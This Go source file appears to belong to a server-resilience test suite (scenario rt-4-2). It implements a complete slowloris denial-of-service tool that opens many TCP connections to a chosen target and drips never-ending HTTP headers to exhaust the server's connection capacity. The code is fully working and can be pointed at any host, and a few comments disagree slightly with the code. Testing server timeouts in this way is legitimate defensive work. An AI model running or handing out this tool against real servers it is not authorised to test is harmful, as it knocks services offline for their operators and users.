// slowloris holds HTTP connections open with partial, slowly-dripped
// requests — the classic slowloris application-layer DoS shape (rt-4-2).
//
// Unlike sockfill (which just holds sockets), slowloris sends just enough
// of a request that the server allocates per-request state and waits for
// the rest, past its ReadHeaderTimeout. Whether the server reaps such
// connections at its timeouts (or lets them pile up to the FD limit) is
// exactly what the scenario measures.
//
// Mode:
//
//	-target http://host:port/path -n N
//	    open N connections; on each, send the request line + headers in
//	    -drip-byte chunks every -interval, then keep the connection open
//	    sending a periodic partial header line ("X-slow: 1..." style) so
//	    read deadlines keep resetting until -hold elapses, then close.
//
// On SIGTERM/SIGINT every connection is closed (SO_LINGER 0, so the
// teardown leaves no TIME_WAIT residue that would skew the next
// measurement).
package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

func main() {
	target := flag.String("target", "", "host:port to hold connections against (no scheme)")
	path := flag.String("path", "/metrics", "request path")
	n := flag.Int("n", 0, "connections to open")
	drip := flag.Int("drip-byte", 1, "bytes per write while dribbling headers")
	interval := flag.Duration("interval", 3*time.Second, "pause between writes (must sit inside the server's read timeouts to keep conns alive)")
	hold := flag.Duration("hold", 0, "hold duration, then close (0 = until SIGTERM)")
	ramp := flag.Duration("ramp", 0, "spread connection opens over this window (0 = all at once)")
	flag.Parse()

	if *target == "" || *n <= 0 {
		fmt.Fprintln(os.Stderr, "slowloris: -target and -n are required")
		os.Exit(2)
	}
	if *drip <= 0 {
		fmt.Fprintln(os.Stderr, "slowloris: -drip-byte must be positive")
		os.Exit(2)
	}

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGTERM, syscall.SIGINT)
	defer stop()

	if *hold > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, *hold)
		defer cancel()
	}

	conns, err := dialAll(ctx, *target, *n, *ramp)
	if err != nil {
		fmt.Fprintf(os.Stderr, "SLOWLORIS_ERR %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("SLOWLORIS_READY conns=%d target=%s drip=%dB interval=%s\n",
		len(conns), *target, *drip, *interval)

	var wg sync.WaitGroup
	for _, c := range conns {
		wg.Add(1)
		go func(c *net.TCPConn) {
			defer wg.Done()
			dribble(ctx, c, *path, *drip, *interval)
		}(c)
	}
	wg.Wait()

	for _, c := range conns {
		_ = c.SetLinger(0)
		_ = c.Close()
	}
	fmt.Println("SLOWLORIS_DONE")
}

// dialAll opens n connections to target, spreading them over ramp.
func dialAll(ctx context.Context, target string, n int, ramp time.Duration) ([]*net.TCPConn, error) {
	conns := make([]*net.TCPConn, 0, n)
	deadline := time.Now().Add(ramp)
	for i := 0; i < n; i++ {
		var d net.Dialer
		c, err := d.DialContext(ctx, "tcp4", target)
		if err != nil {
			for _, ec := range conns {
				_ = ec.SetLinger(0)
				_ = ec.Close()
			}
			return nil, fmt.Errorf("dial %d/%d: %w", i+1, n, err)
		}
		tc, ok := c.(*net.TCPConn)
		if !ok {
			_ = c.Close()
			return nil, fmt.Errorf("dial %d: not a TCP conn", i+1)
		}
		conns = append(conns, tc)
		if ramp > 0 {
			share := ramp / time.Duration(n)
			next := deadline.Add(-time.Duration(n-i-1) * share)
			if sleep := time.Until(next); sleep > 0 {
				select {
				case <-time.After(sleep):
				case <-ctx.Done():
					return conns, nil
				}
			}
		}
	}
	return conns, nil
}

// dribble sends a request that never finishes: the request line and
// headers drip out drip bytes at a time, and once the drip exhausts the
// prepared bytes it keeps sending "\r\n" padding fragments, so the server
// is always mid-header and never timing out on idle.
func dribble(ctx context.Context, c *net.TCPConn, path string, drip int, interval time.Duration) {
	payload := "GET " + path + " HTTP/1.1\r\nHost: slowloris\r\nX-slow: "
	rest := payload
	for {
		if len(rest) > 0 {
			chunk := rest
			if len(chunk) > drip {
				chunk = chunk[:drip]
			}
			if _, err := c.Write([]byte(chunk)); err != nil {
				return
			}
			rest = rest[len(chunk):]
		} else {
			// Mid-header padding: never a full CRLF-terminated line, so
			// the parser stays in its read loop and read deadlines reset.
			if _, err := c.Write([]byte("1")); err != nil {
				return
			}
		}
		select {
		case <-time.After(interval):
		case <-ctx.Done():
			return
		}
	}
}
